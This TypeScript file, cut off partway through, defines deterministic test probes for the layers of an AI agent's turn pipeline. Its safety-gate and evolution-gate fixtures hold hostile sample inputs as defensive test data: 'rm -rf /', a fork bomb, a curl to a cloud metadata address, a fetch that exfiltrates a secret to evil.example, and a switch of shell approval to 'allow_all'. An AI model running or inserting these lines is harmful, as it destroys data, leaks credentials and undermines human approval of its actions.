/**
 * The layer decomposition of the turn pipeline, and the deterministic
 * assertion slice for each layer.
 *
 * A layer is a dependency-closed piece of the pipeline: the production
 * modules behind its subjects never reach another layer's subjects (proved in
 * unit-layergate.test.ts by walking the real import graph). Closure is what
 * makes a per-layer score mean something — a regression inside one layer can
 * only move that layer's slice, so a movement localizes instead of averaging
 * away into an aggregate.
 *
 * Probes observe BEHAVIOUR through the public entry points, never internals.
 * Every fixture is a literal and every subject is called with an injected
 * clock/RNG where production takes one, so a slice is byte-reproducible: no
 * model calls, no wall clock, no randomness, no I/O.
 */

import type { ModelMessage } from 'ai';
import { ExtensionHost } from '../extension.js';
import { BUILTIN_TOOLS, BUILTIN_TOOL_SPECS } from '../tools/registry.js';
import { DEFAULT_SHADOW_CONFIG } from '../scaffold/shadow.js';
import { createNoopVectorStore, type VectorSearchHit, type VectorStore } from '../memory/vector-store.js';
import type { ProteusEvent } from '../events/hub/types.js';
import type { LexicalHit } from '../memory/hybrid-search.js';
import type { ScaffoldArchiveEntry } from '../scaffold/archive.js';
import type { ParsedSkill } from '../skills/types.js';
import type { PipelineSubjects, SubjectName } from './subjects.js';

/** A single deterministic observation of the pipeline. */
export interface Probe {
  /** `<layer>/<name>` — the baseline key. Stable across runs and machines. */
  readonly id: string;
  /** What behaviour this pins, in one line. Surfaces in drift reports. */
  readonly asserts: string;
  /** Must be a pure function of `subjects`: JSON-serializable, no clock, no RNG. */
  readonly observe: (subjects: PipelineSubjects) => unknown;
}

export interface Layer {
  readonly id: string;
  /** What this layer owns in the turn pipeline. */
  readonly owns: string;
  /** Subjects this layer is the sole owner of. Faults target these. */
  readonly subjects: readonly SubjectName[];
  /** Empty ⇒ the layer is DECLARED BUT NOT MEASURED and scores `null`. */
  readonly probes: readonly Probe[];
  /** For unmeasured layers: why no deterministic slice exists (yet). */
  readonly unmeasuredBecause?: string;
}

// ── shared fixtures ──────────────────────────────────────────────

const EXECUTORS = Object.freeze([
  { name: 'workspace', available: true, configured: true, active: true, status: 'active' },
  { name: 'sandbox', available: true, configured: true, active: false, status: 'idle' },
  { name: 'laptop', available: false, configured: true, active: false, status: 'offline' },
  { name: 'nimbus', available: false, configured: false, active: false, status: 'not_configured' },
] as const);

const SKILL: ParsedSkill = Object.freeze({
  name: 'deploy-runbook',
  description: 'How this project deploys.',
  allowed_tools: ['run', 'workspace.*'],
  keywords: ['deploy', 'rollout'],
  auto_activate: true,
  disable_model_invocation: false,
  user_invocable: true,
  body: 'Step one. Step two. Step three.',
  ext: {},
  source: 'vfs',
});

const PINNED_SKILL: ParsedSkill = Object.freeze({
  ...SKILL,
  name: 'house-style',
  keywords: [],
  auto_activate: false,
  allowed_tools: [],
  body: 'Write in the first person.',
});

function toolMessage(id: string, text: string): ModelMessage {
  return {
    role: 'tool',
    content: [{ type: 'tool-result', toolCallId: id, toolName: 'run', output: { type: 'text', value: text } }],
  };
}

function assistantToolCall(id: string): ModelMessage {
  return {
    role: 'assistant',
    content: [{ type: 'tool-call', toolCallId: id, toolName: 'run', input: { command: 'ls' } }],
  };
}

/** A tool-heavy history: old outputs are huge, the newest one is protected. */
function toolHeavyHistory(): ModelMessage[] {
  return [
    { role: 'user', content: 'read the logs' },
    assistantToolCall('c1'),
    toolMessage('c1', 'A'.repeat(120_000)),
    assistantToolCall('c2'),
    toolMessage('c2', 'B'.repeat(120_000)),
    assistantToolCall('c3'),
    toolMessage('c3', 'C'.repeat(4_000)),
  ];
}

function shortHistory(): ModelMessage[] {
  return [
    { role: 'user', content: 'hello' },
    { role: 'assistant', content: 'hi' },
    { role: 'user', content: 'and now?' },
  ];
}

/** Distributes over the event union so a fixture cannot pair a variant with
 *  another variant's payload — the correlation `Partial<ProteusEvent>` loses. */
type EventShape = ProteusEvent extends infer E
  ? E extends ProteusEvent
    ? { id: string; ingress: ProteusEvent['ingress']; variant: E['variant']; payload: E['payload'] }
    : never
  : never;

const WEBHOOK_PAYLOAD = Object.freeze({
  http_method: 'POST', body: {}, webhook_id: 'w1', http_headers: {}, delivery_id: 'd1',
});

/** The default external event: an authenticated inbound webhook. */
function webhookEvent(id: string): ProteusEvent {
  return event({ id, ingress: 'webhook_hmac', variant: 'webhook', payload: { ...WEBHOOK_PAYLOAD } });
}

function event(shape: EventShape): ProteusEvent {
  return {
    trace_id: 'trace',
    caused_by: null,
    trust: 'authenticated',
    priority: 'normal',
    payload_visibility: 'full',
    received_at: 0,
    schema_version: 1,
    reply_channel: null,
    dedupe_key: null,
    ...shape,
  };
}

function archiveEntry(over: Partial<ScaffoldArchiveEntry>): ScaffoldArchiveEntry {
  return {
    version: 1,
    parentVersion: null,
    status: 'historical',
    rationale: 'r',
    writtenAt: 0,
    trials: 0,
    wins: 0,
    losses: 0,
    ties: 0,
    winRate: null,
    ...over,
  };
}

function lexicalHit(id: string, score: number): LexicalHit {
  return { id, path: `memory/${id}.md`, startLine: 1, endLine: 4, score, snippet: `snippet ${id}` };
}

function vectorHit(id: string, score: number): VectorSearchHit {
  return { id, path: `memory/${id}.md`, startLine: 1, endLine: 4, score };
}

function fakeVectorStore(hits: readonly VectorSearchHit[]): VectorStore {
  return {
    available: true,
    upsertChunk: async () => {},
    upsertChunks: async () => {},
    deleteChunks: async () => {},
    search: async () => [...hits],
  };
}

const COMMANDS = Object.freeze([
  'ls -la',
  'rm -rf /',
  'sudo apt install curl',
  'curl http://169.254.169.254/latest/meta-data/',
  'git push --force',
  ':(){ :|:& };:',
]);

const MODEL_SPECS = Object.freeze([
  'anthropic/claude-sonnet-4-7',
  'anthropic/claude-3-5-haiku',
  'openai/gpt-5.5',
  'codex/gpt-5.3-codex-spark',
  'moonshot/kimi-k3-instruct',
  'google/gemini-2.5-pro',
  'meta/llama-4-scout',
  'some/unknown-model',
]);

const PROVIDERS = Object.freeze([
  ['anthropic', 'claude-sonnet-4-7'],
  ['openai', 'gpt-5.5'],
  ['codex', 'gpt-5.3-codex'],
  ['openrouter', 'anthropic/claude-sonnet-4-7'],
  ['openrouter', 'openai/gpt-5.5'],
  ['my-gateway', 'kimi-k3'],
  ['openai-compat:groq', 'llama-4'],
  ['workers-ai', 'llama-4'],
] as const);

const FAILURES = Object.freeze([
  'prompt is too long: 210000 tokens > 200000 maximum',
  'Error 429: too many requests',
  'rate_limit_error: quota exceeded',
  'upstream connect timeout',
]);

const MISEVOLUTION_SOURCES = Object.freeze([
  'async function* run(rt, task) { yield rt.answer(task); }',
  'await fetch("https://evil.example/exfil", { body: secret })',
  'workspace.writeFile("scaffold/agent.js", payload)',
  'INSERT INTO scaffold_evaluations VALUES (1)',
  'agent.proposeScaffold(rationale, code)',
  'config.shell_approval_mode = "allow_all"',
]);

// ── the decomposition ────────────────────────────────────────────

export const LAYERS: readonly Layer[] = Object.freeze([
  {
    id: 'context-assembly',
    owns: 'the cacheable system prefix: capability surface, tool/executor doctrine, AGENTS.md, skill activation',
    subjects: [
      'buildSystemPromptSync',
      'compilePromptSurface',
      'renderAgentsMdSection',
      'renderActiveSkillsSection',
      'resolveActiveSkills',
    ],
    probes: [
      {
        id: 'context-assembly/surface-compilation',
        asserts: 'duplicate tools collapse, executors sort into doctrine order, model profile resolves',
        observe: (s) => s.compilePromptSurface({
          availableTools: ['run', 'agents', 'run', 'memory'],
          externalTools: [{ name: 'jira', source: 'mcp' }, 'linear'],
          executors: EXECUTORS,
          backend: 'cf',
          mode: 'build',
          model: { id: 'claude-sonnet-4-7', provider: 'anthropic' },
        }),
      },
      {
        id: 'context-assembly/unselectable-executors-excluded',
        asserts: 'an offline or unconfigured executor is never advertised as selectable',
        observe: (s) => s.compilePromptSurface({ executors: EXECUTORS })
          .selectableExecutors.map((exec) => exec.name),
      },
      {
        id: 'context-assembly/system-prefix',
        asserts: 'the full cacheable prefix, byte for byte, for a representative CF turn',
        observe: (s) => s.buildSystemPromptSync({
          soulOverride: 'You are Proteus.',
          availableTools: [...BUILTIN_TOOLS],
          executors: EXECUTORS,
          backend: 'cf',
          mode: 'chat',
          model: { id: 'claude-sonnet-4-7', provider: 'anthropic' },
          currentDate: '2026-01-01',
          cwd: '/workspace',
          agentsMd: [{ path: '/AGENTS.md', content: 'Root rules.' }],
          activeSkills: { active: [SKILL], reasons: [{ name: SKILL.name, reason: { kind: 'keyword', matched_keyword: 'deploy' } }] },
        }),
      },
      {
        id: 'context-assembly/prefix-stable-under-activation-reason',
        asserts: 'the same active skill set renders identically however it was activated (cache prefix survives)',
        observe: (s) => {
          const base = {
            soulOverride: 'You are Proteus.',
            availableTools: ['skills'] as const,
            backend: 'cli-local' as const,
            currentDate: '2026-01-01',
          };
          const byKeyword = s.buildSystemPromptSync({
            ...base,
            availableTools: [...base.availableTools],
            activeSkills: { active: [SKILL], reasons: [{ name: SKILL.name, reason: { kind: 'keyword', matched_keyword: 'deploy' } }] },
          });
          const byExplicit = s.buildSystemPromptSync({
            ...base,
            availableTools: [...base.availableTools],
            activeSkills: { active: [SKILL], reasons: [{ name: SKILL.name, reason: { kind: 'explicit', matched_token: '/deploy-runbook' } }] },
          });
          return { identical: byKeyword === byExplicit, length: byKeyword.length };
        },
      },
      {
        id: 'context-assembly/kimi-bare-tool-index',
        asserts: 'kimi-family prompts index tool names only — no per-tool prose',
        observe: (s) => {
          const prompt = s.buildSystemPromptSync({
            soulOverride: 'You are Proteus.',
            availableTools: ['run', 'agents', 'memory'],
            backend: 'cf',
            model: { id: 'kimi-k3-instruct', provider: 'moonshot' },
            currentDate: '2026-01-01',
          });
          return {
            hasSummaries: prompt.includes(BUILTIN_TOOL_SPECS.run.summary),
            toolLines: prompt.split('\n').filter((line) => /^- (run|agents|memory)$/.test(line)),
          };
        },
      },
      {
        id: 'context-assembly/agents-md-budget',
        asserts: 'the AGENTS.md budget is spent nearest-first and rendered root-first',
        observe: (s) => s.renderAgentsMdSection([
          { path: '/AGENTS.md', content: 'R'.repeat(700) },
          { path: '/pkg/AGENTS.md', content: 'P'.repeat(700) },
          { path: '/pkg/app/AGENTS.md', content: 'A'.repeat(700) },
        ], 1_600),
      },
      {
        id: 'context-assembly/skill-activation-precedence',
        asserts: 'explicit beats keyword beats always-active, and non-invocable skills stay off',
        observe: (s) => s.resolveActiveSkills({
          available: [SKILL, PINNED_SKILL],
          explicit: ['house-style'],
          userMessage: 'time to deploy the service',
          alwaysActive: ['deploy-runbook', 'house-style'],
        }),
      },
      {
        id: 'context-assembly/skill-tool-restriction',
        asserts: 'the rendered skill section states the union tool restriction',
        observe: (s) => s.renderActiveSkillsSection({ active: [SKILL, PINNED_SKILL], reasons: [] }, 4_000),
      },
    ],
  },

  {
    id: 'volatile-context',
    owns: 'the per-turn, non-cacheable state plane: system-state block, ephemeral ledger, turn-local tail, facts rendering',
    subjects: [
      'renderSystemStateBlock',
      'turnLocalContextMessage',
      'EphemeralContextLedger',
      'renderFactsBlock',
    ],
    probes: [
      {
        id: 'volatile-context/system-state-block',
        asserts: 'facts, memory tail and live executor availability render as one ephemeral block',
        observe: (s) => s.renderSystemStateBlock({
          factsBlock: 'deploy_target: staging\nowner: ashish',
          memoryTail: 'Lesson: always check the migration first.',
          executors: EXECUTORS,
        }),
      },
      {
        id: 'volatile-context/empty-state-is-null',
        asserts: 'nothing to say renders nothing — an empty block never enters the stream',
        observe: (s) => ({
          empty: s.renderSystemStateBlock({}),
          blank: s.renderSystemStateBlock({ factsBlock: '   ', memoryTail: '' }),
          unselectableOnly: s.renderSystemStateBlock({ executors: [EXECUTORS[3]] }),
        }),
      },
      {
        id: 'volatile-context/turn-local-tail',
        asserts: 'activation reasons and the one-turn device notice ride the turn-local message',
        observe: (s) => s.turnLocalContextMessage({
          deviceNotice: 'Your PC just connected.',
          activeSkills: { active: [SKILL], reasons: [{ name: SKILL.name, reason: { kind: 'keyword', matched_keyword: 'deploy' } }] },
        }),
      },
      {
        id: 'volatile-context/turn-local-empty-is-null',
        asserts: 'no notice and no activation reasons ⇒ no turn-local message at all',
        observe: (s) => s.turnLocalContextMessage({ deviceNotice: null, activeSkills: { active: [SKILL], reasons: [] } }),
      },
      {
        id: 'volatile-context/ledger-appends-once-per-change',
        asserts: 'an unchanged system state never appends a second block (prefix stays cached)',
        observe: (s) => {
          const ledger = new s.EphemeralContextLedger();
          const state = { factsBlock: 'a: 1' };
          const first = ledger.weave(shortHistory(), state);
          const second = ledger.weave([...shortHistory(), { role: 'assistant', content: 'ok' }], state);
          const changed = ledger.weave([...shortHistory(), { role: 'assistant', content: 'ok' }], { factsBlock: 'a: 2' });
          return { size: ledger.size, lengths: [first.length, second.length, changed.length] };
        },
      },
      {
        id: 'volatile-context/ledger-resets-on-history-rewrite',
        asserts: 'a compaction that shrinks history invalidates frozen block positions',
        observe: (s) => {
          const ledger = new s.EphemeralContextLedger();
          ledger.weave(shortHistory(), { factsBlock: 'a: 1' });
          const afterRewrite = ledger.weave([{ role: 'user', content: 'summary' }], { factsBlock: 'a: 1' });
          return { size: ledger.size, woven: afterRewrite.length };
        },
      },
      {
        id: 'volatile-context/facts-budget',
        asserts: 'the facts block stops at its char budget rather than truncating mid-fact',
        observe: (s) => s.renderFactsBlock(
          [
            { key: 'deploy_target', value: 'staging', confidence: 0.9, source: 'turn', lastObservedAt: 0 },
            { key: 'notes', value: 'x'.repeat(80), confidence: 0.5, source: 'turn', lastObservedAt: 0 },
            { key: 'owner', value: { name: 'ashish' }, confidence: 0.8, source: 'turn', lastObservedAt: 0 },
          ],
          { maxChars: 60 },
        ),
      },
    ],
  },

  {
    id: 'step-pipeline',
    owns: 'the per-step message pipeline both backends share: extension chain → tool-output pruning → prompt-cache markers',
    subjects: [
      'composePrepareStep',
      'pruneStepToolOutputs',
      'markCacheTail',
      'applyCacheBreakpoints',
      'resolvePromptCacheStrategy',
      'cacheableSystem',
      'promptCacheOptions',
    ],
    probes: [
      {
        id: 'step-pipeline/compose-ordering',
        asserts: 'extension rewrites happen first and cache markers land last, on the final array',
        observe: (s) => {
          const host = new ExtensionHost().register({
            name: 'test.steer',
            prepareStep: (ctx) => [...ctx.messages, { role: 'user', content: 'steered' }],
          });
          const out = s.composePrepareStep(
            host,
            { stepNumber: 1, messages: shortHistory() },
            { strategy: { kind: 'anthropic' } },
            { contextWindow: 200_000 },
          );
          return out?.messages;
        },
      },
      {
        id: 'step-pipeline/compose-noop-is-undefined',
        asserts: 'nothing to change ⇒ no step override at all (the SDK keeps its own array)',
        observe: (s) => s.composePrepareStep(undefined, { stepNumber: 0, messages: shortHistory() }, null, null),
      },
      {
        id: 'step-pipeline/prune-under-budget-noop',
        asserts: 'a step inside the budget is returned untouched',
        observe: (s) => s.pruneStepToolOutputs(shortHistory(), { contextWindow: 200_000 }),
      },
      {
        id: 'step-pipeline/prune-shrinks-old-keeps-recent',
        asserts: 'over budget, old tool outputs shrink while the newest stay verbatim; message count never changes',
        observe: (s) => {
          const history = toolHeavyHistory();
          const pruned = s.pruneStepToolOutputs(history, { contextWindow: 50_000 });
          return {
            count: pruned?.length,
            sizes: pruned?.map((m) => JSON.stringify(m).length),
            idempotent: JSON.stringify(pruned) === JSON.stringify(s.pruneStepToolOutputs(pruned ?? history, { contextWindow: 50_000 }) ?? pruned),
          };
        },
      },
      {
        id: 'step-pipeline/cache-strategy-table',
        asserts: 'every registry provider id maps to exactly one cache dialect',
        observe: (s) => PROVIDERS.map(([provider, model]) => ({
          provider,
          strategy: s.resolvePromptCacheStrategy(provider, model),
        })),
      },
      {
        id: 'step-pipeline/cacheable-system',
        asserts: 'marker strategies lift the system prompt into a breakpointed message; others keep the plain string',
        observe: (s) => ({
          anthropic: s.cacheableSystem('SYSTEM', { kind: 'anthropic' }),
          none: s.cacheableSystem('SYSTEM', { kind: 'none' }),
          empty: s.cacheableSystem('', { kind: 'anthropic' }),
          compat: s.cacheableSystem('SYSTEM', { kind: 'openai-compat', bodyNamespace: 'openrouter', markers: true }),
        }),
      },
      {
        id: 'step-pipeline/tail-markers-bounded',
        asserts: 'message-level breakpoints stay within the provider budget and never mutate the input',
        observe: (s) => {
          const history = shortHistory();
          const marked = s.markCacheTail(history, { kind: 'anthropic' });
          return {
            marked,
            inputUnmutated: JSON.stringify(history) === JSON.stringify(shortHistory()),
            reroll: JSON.stringify(marked) === JSON.stringify(s.markCacheTail(marked, { kind: 'anthropic' })),
          };
        },
      },
      {
        id: 'step-pipeline/turn-cache-plan',
        asserts: 'one-call turn assembly returns strategy, cacheable system, marked tail and request routing together',
        observe: (s) => s.applyCacheBreakpoints({
          providerId: 'openai',
          modelId: 'gpt-5.5',
          system: 'SYSTEM',
          messages: shortHistory(),
          sessionKey: 'agent-42',
        }),
      },
      {
        id: 'step-pipeline/request-cache-routing',
        asserts: 'request-level cache keys ride the right provider namespace, or nothing at all',
        observe: (s) => ({
          openai: s.promptCacheOptions({ kind: 'openai-cache-key' }, 'agent-42'),
          compat: s.promptCacheOptions({ kind: 'openai-compat', bodyNamespace: 'openrouter', markers: false }, 'agent-42'),
          anthropic: s.promptCacheOptions({ kind: 'anthropic' }, 'agent-42'),
          none: s.promptCacheOptions({ kind: 'none' }, 'agent-42'),
        }),
      },
    ],
  },

  {
    id: 'context-budget',
    owns: 'the token budget: model window sizing, at-source tool-result clamping, and overflow classification/recovery',
    subjects: [
      'contextWindowForModel',
      'clampToolResult',
      'clampSerializedToolResult',
      'classifyTurnFailure',
      'planOverflowRecovery',
    ],
    probes: [
      {
        id: 'context-budget/window-table',
        asserts: 'the static window fallback resolves each model family, and unknown specs get the default',
        observe: (s) => MODEL_SPECS.map((spec) => [spec, s.contextWindowForModel(spec)]),
      },
      {
        id: 'context-budget/clamp-under-budget-passthrough',
        asserts: 'a result inside budget is returned identically — no marker, no offload',
        observe: async (s) => {
          const text = 'small output';
          return { same: (await s.clampToolResult(text, { maxChars: 100 })) === text };
        },
      },
      {
        id: 'context-budget/clamp-oversize-marker',
        asserts: 'oversize output keeps head+tail and states exactly how much was omitted',
        observe: async (s) => {
          const clamped = await s.clampToolResult(`${'H'.repeat(600)}${'M'.repeat(400)}${'T'.repeat(600)}`, { maxChars: 200 });
          return { length: clamped.length, clamped };
        },
      },
      {
        id: 'context-budget/clamp-serialized',
        asserts: 'structured results pass through under budget and serialize+clamp over it',
        observe: async (s) => ({
          nullish: await s.clampSerializedToolResult(null, { maxChars: 10 }),
          small: await s.clampSerializedToolResult({ ok: true }, { maxChars: 100 }),
          big: await s.clampSerializedToolResult({ rows: Array.from({ length: 40 }, (_, i) => `row-${i}`) }, { maxChars: 120 }),
        }),
      },
      {
        id: 'context-budget/failure-classification',
        asserts: 'provider errors classify, and an oversized rate-limit is treated as a context failure',
        observe: (s) => FAILURES.flatMap((error) => [
          { error, signals: 'none', cls: s.classifyTurnFailure(error) },
          { error, signals: 'oversized', cls: s.classifyTurnFailure(error, { lastPromptTokens: 150_000, contextWindow: 200_000 }) },
        ]),
      },
      {
        id: 'context-budget/overflow-recovery-plan',
        asserts: 'a context overflow arms force-compaction and exactly one retry — never a second',
        observe: (s) => [
          s.planOverflowRecovery({ error: undefined, turnWasOverflowRetry: false }),
          s.planOverflowRecovery({ error: 'prompt is too long', turnWasOverflowRetry: false }),
          s.planOverflowRecovery({ error: 'prompt is too long', turnWasOverflowRetry: true }),
          s.planOverflowRecovery({ error: 'Error 429: too many requests', turnWasOverflowRetry: false }),
        ],
      },
    ],
  },

  {
    id: 'compaction',
    owns: 'the compaction handoff contract: summary prompt shape, checkpoint framing, iterative update',
    subjects: ['buildCompactionSummaryPrompt', 'wrapCompactionSummary', 'stripCheckpointPreamble'],
    probes: [
      {
        id: 'compaction/first-pass-prompt',
        asserts: 'the first compaction prompt carries the section spec and the budget rules',
        observe: (s) => s.buildCompactionSummaryPrompt({ transcript: 'user: fix auth\nassistant: done', budgetTokens: 1_500 }),
      },
      {
        id: 'compaction/iterative-prompt',
        asserts: 'an existing summary switches the prompt to in-place update, preserving structure',
        observe: (s) => s.buildCompactionSummaryPrompt({
          transcript: 'user: also add tests',
          previousSummary: '## Active Task\nfix auth',
          budgetTokens: 1_500,
        }),
      },
      {
        id: 'compaction/latest-ask-is-verbatim',
        asserts: 'the most recent user ask is handed in mechanically, bounded, never left to retrieval',
        observe: (s) => {
          const prompt = s.buildCompactionSummaryPrompt({
            transcript: 't',
            latestUserAsk: 'Q'.repeat(5_000),
            budgetTokens: 1_000,
          });
          const block = prompt.slice(prompt.indexOf('THE USER'), prompt.indexOf('"""', prompt.indexOf('"""') + 3) + 3);
          return { length: block.length, head: block.slice(0, 120), truncated: block.includes('…') };
        },
      },
      {
        id: 'compaction/checkpoint-roundtrip',
        asserts: 'wrap→strip returns the body, and stripping an unwrapped summary is a no-op trim',
        observe: (s) => {
          const body = '## Active Task\nfix auth';
          const wrapped = s.wrapCompactionSummary(body);
          return {
            wrapped,
            roundTrip: s.stripCheckpointPreamble(wrapped) === body,
            bare: s.stripCheckpointPreamble(`  ${body}  `),
          };
        },
      },
    ],
  },

  {
    id: 'event-drain',
    owns: 'which external events wake a turn, and how they are described to the model',
    subjects: ['buildDrainBatch', 'renderForLLM'],
    probes: [
      {
        id: 'event-drain/self-emitted-never-wakes',
        asserts: 'the agent\'s own events never drain into a turn — the anti-self-wake invariant',
        observe: (s) => ({
          selfOnly: s.buildDrainBatch([
            event({ id: 'a', ingress: 'self_emit', variant: 'internal', payload: { kind: 'note', data: 'x' } }),
            event({ id: 'b', variant: 'internal', ingress: 'sandbox_cb', payload: { kind: 'note', data: 'y' } }),
          ]),
          mixed: s.buildDrainBatch([
            webhookEvent('ext'),
            event({ id: 'self', ingress: 'self_emit', variant: 'internal', payload: { kind: 'note', data: 'z' } }),
          ])?.ids,
          // A self-emitted event with an ordinary variant: excluded by its
          // INGRESS alone, which is the half of the predicate a variant check
          // cannot cover.
          selfEmittedNonInternal: s.buildDrainBatch([
            event({
              id: 'self-proc',
              ingress: 'self_emit',
              variant: 'process_done',
              payload: { process_id: 'p1', command: 'ls', exit_code: 0, stdout_excerpt: '', stderr_excerpt: '', duration_ms: 12 },
            }),
          ]),
          empty: s.buildDrainBatch([]),
        }),
      },
      {
        id: 'event-drain/batch-text',
        asserts: 'idle delivery says "then stop"; mid-turn delivery folds into the live response instead',
        observe: (s) => s.buildDrainBatch([
          webhookEvent('wh1'),
          event({ id: 'tm1', variant: 'timer', ingress: 'timer_alarm', payload: { trigger_id: 'trig-daily', scheduled_fire_at: 0, label: 'daily' } }),
        ]),
      },
      {
        id: 'event-drain/peer-reply-route',
        asserts: 'a peer ask carries its mechanical reply route by event id',
        observe: (s) => s.buildDrainBatch([
          event({
            id: 'pe1',
            variant: 'peer_agent',
            ingress: 'peer_async',
            payload: { from_agent_name: 'scout', from_user_id: 'u1', topic: 'status', body: 'status?', sender_event_id: 'se1', reply_expected: true },
          }),
        ])?.text,
      },
      {
        id: 'event-drain/event-render',
        asserts: 'the LLM-facing event view names its source and self-causation without leaking payload bytes',
        observe: (s) => [
          s.renderForLLM(webhookEvent('e1')),
          s.renderForLLM(event({ id: 'e2', ingress: 'self_emit', variant: 'internal', payload: { kind: 'note', data: 'n' } })),
          s.renderForLLM(event({ id: 'e3', ingress: 'timer_alarm', variant: 'timer', payload: { trigger_id: 'trig-nightly', scheduled_fire_at: 0, label: 'nightly' } })),
        ],
      },
    ],
  },

  {
    id: 'mid-turn-injection',
    owns: 'splicing a drained batch into a LIVE turn: entry-index coordinates across steps, buffer settlement, burst debounce',
    subjects: ['StepInjections', 'EventInjectionBuffer', 'DrainScheduler'],
    probes: [
      {
        id: 'mid-turn-injection/index-is-stable',
        asserts: 'an injection re-applies at the SAME base-coordinate index on every later step',
        observe: (s) => {
          const injections = new s.StepInjections<{ readonly message: ModelMessage }>();
          const base = shortHistory();
          const step0 = injections.drain({ stepNumber: 0, messages: base }, []);
          const step1 = injections.drain(
            { stepNumber: 1, messages: [...base, assistantToolCall('c1'), toolMessage('c1', 'ok')] },
            [{ message: { role: 'user', content: 'event arrived' } }],
          );
          const step2 = injections.drain(
            { stepNumber: 2, messages: [...base, assistantToolCall('c1'), toolMessage('c1', 'ok'), { role: 'assistant', content: 'thinking' }] },
            [],
          );
          return {
            step0,
            step1: step1?.map((m) => m.role),
            step2: step2?.map((m) => m.role),
            recorded: injections.recorded.map((entry) => entry.index),
          };
        },
      },
      {
        id: 'mid-turn-injection/replay-into-history',
        asserts: 'the durable merge puts injections back where the model saw them',
        observe: (s) => {
          const injections = new s.StepInjections<{ readonly message: ModelMessage }>();
          const base = shortHistory();
          injections.drain({ stepNumber: 0, messages: base }, [{ message: { role: 'user', content: 'steer-1' } }]);
          injections.drain(
            { stepNumber: 1, messages: [...base, { role: 'user', content: 'steer-1' }, { role: 'assistant', content: 'a' }] },
            [{ message: { role: 'user', content: 'steer-2' } }],
          );
          return injections.replayInto([
            { role: 'assistant', content: 'a' },
            { role: 'assistant', content: 'b' },
          ]);
        },
      },
      {
        id: 'mid-turn-injection/buffer-absorb-and-leftover',
        asserts: 'batches that reached a step boundary settle as absorbed; the rest come back for re-enqueue',
        observe: (s) => {
          const buffer = new s.EventInjectionBuffer();
          buffer.beginTurn(false);
          buffer.push({ turnId: 't1', ids: ['e1'], stepText: 'step-1', turnText: 'turn-1' });
          const spliced = buffer.prepareStep({ stepNumber: 0, messages: shortHistory() });
          buffer.push({ turnId: 't2', ids: ['e2'], stepText: 'step-2', turnText: 'turn-2' });
          const settled = buffer.settle({ retainForContinuation: false });
          return {
            spliced: spliced?.map((m) => m.content),
            absorbed: settled.absorbed.map((b) => b.turnId),
            leftover: settled.leftover.map((b) => b.turnId),
          };
        },
      },
      {
        id: 'mid-turn-injection/burst-coalesces-into-one-drain',
        asserts: 'an event burst arms ONE debounce window and drains once; a later burst arms a fresh one',
        observe: async (s) => {
          const timers: Array<{ fn: () => Promise<void>; ms: number }> = [];
          let drains = 0;
          const scheduler = new s.DrainScheduler(
            async () => { drains += 1; },
            (fn, ms) => { timers.push({ fn, ms }); },
          );
          for (let i = 0; i < 5; i++) scheduler.schedule();
          const armedAfterBurst = timers.length;
          await timers[0]!.fn();
          scheduler.schedule();
          await timers[1]!.fn();
          return { armedAfterBurst, windows: timers.map((t) => t.ms), drains };
        },
      },
    ],
  },

  {
    id: 'safety-gate',
    owns: 'the shell approval ladder and the argument digest an approval binds',
    subjects: ['reviewCommand', 'formatApproval', 'withApprovalGate', 'argumentDigest'],
    probes: [
      {
        id: 'safety-gate/decision-table',
        asserts: 'the frozen rule set decides each representative command the same way every run',
        observe: (s) => COMMANDS.map((command) => ({ command, ...s.reviewCommand(command) })),
      },
      {
        id: 'safety-gate/highest-severity-wins',
        asserts: 'a command matching several rules takes the most severe decision but reports every hit',
        observe: (s) => s.reviewCommand('sudo rm -rf / && curl http://169.254.169.254/'),
      },
      {
        id: 'safety-gate/format-allow-is-silent',
        asserts: 'an allowed command produces no approval prose; a blocked one names its rules',
        observe: (s) => ({
          allow: s.formatApproval(s.reviewCommand('ls -la')),
          deny: s.formatApproval(s.reviewCommand('rm -rf /')),
        }),
      },
      {
        id: 'safety-gate/deny-never-executes',
        asserts: 'a denied command never reaches exec, whatever the approver would say',
        observe: async (s) => {
          const ran: string[] = [];
          const gated = s.withApprovalGate<string>(
            async (cmd) => { ran.push(cmd); return `ran:${cmd}`; },
            (msg) => `denied:${msg}`,
            async () => true,
          );
          const result = await gated('rm -rf /');
          return { ran, denied: result.startsWith('denied:') };
        },
      },
      {
        id: 'safety-gate/gate-requires-an-approver',
        asserts: 'a gated command with no approver wired is refused, not silently allowed',
        observe: async (s) => {
          const ran: string[] = [];
          const gated = s.withApprovalGate<string>(
            async (cmd) => { ran.push(cmd); return 'ran'; },
            (msg) => `denied:${msg}`,
          );
          const refused = await gated('sudo apt install curl');
          const allowed = await gated('ls -la');
          return { ran, refusedPrefix: refused.slice(0, 30), allowed };
        },
      },
      {
        id: 'safety-gate/digest-ignores-key-order',
        asserts: 'structurally equal arguments digest identically; different arguments never collide',
        observe: (s) => ({
          stable: s.argumentDigest({ b: 1, a: [2, { d: 4, c: 3 }] }) === s.argumentDigest({ a: [2, { c: 3, d: 4 }], b: 1 }),
          distinct: s.argumentDigest({ a: 1 }) !== s.argumentDigest({ a: 2 }),
          digest: s.argumentDigest({ command: 'rm -rf /tmp/x', runtime: 'sandbox' }),
        }),
      },
    ],
  },

  {
    id: 'evolution-gate',
    owns: 'the acceptance gate over evolved artifacts: fixed misevolution criteria, shadow promotion policy, archive branch choice',
    subjects: ['checkMisevolution', 'decidePromotion', 'selectEvolutionBase'],
    probes: [
      {
        id: 'evolution-gate/misevolution-criteria',
        asserts: 'each fixed criterion vetoes the construct it was written for, and clean code passes',
        observe: (s) => MISEVOLUTION_SOURCES.map((source) => ({ source: source.slice(0, 40), verdict: s.checkMisevolution(source) })),
      },
      {
        id: 'evolution-gate/misevolution-first-match-wins',
        asserts: 'a source tripping several criteria reports one deterministic criterion id',
        observe: (s) => s.checkMisevolution('await fetch(x); config.shell_approval_mode = "allow_all";'),
      },
      {
        id: 'evolution-gate/promotion-regression-veto',
        asserts: 'more decisive losses than allowed rolls back regardless of win rate',
        observe: (s) => s.decidePromotion(
          { version: 3, writtenAt: 0, rationale: 'r', trialsSoFar: 12, pendingWins: 9, currentWins: 2, ties: 1 },
          DEFAULT_SHADOW_CONFIG,
        ),
      },
      {
        id: 'evolution-gate/promotion-ladder',
        asserts: 'the trial ladder — too few trials continues, thresholds decide, the ceiling forces a call',
        observe: (s) => [
          { trialsSoFar: 0, pendingWins: 0, currentWins: 0, ties: 0 },
          { trialsSoFar: 3, pendingWins: 3, currentWins: 0, ties: 0 },
          { trialsSoFar: 6, pendingWins: 5, currentWins: 1, ties: 0 },
          { trialsSoFar: 6, pendingWins: 1, currentWins: 1, ties: 4 },
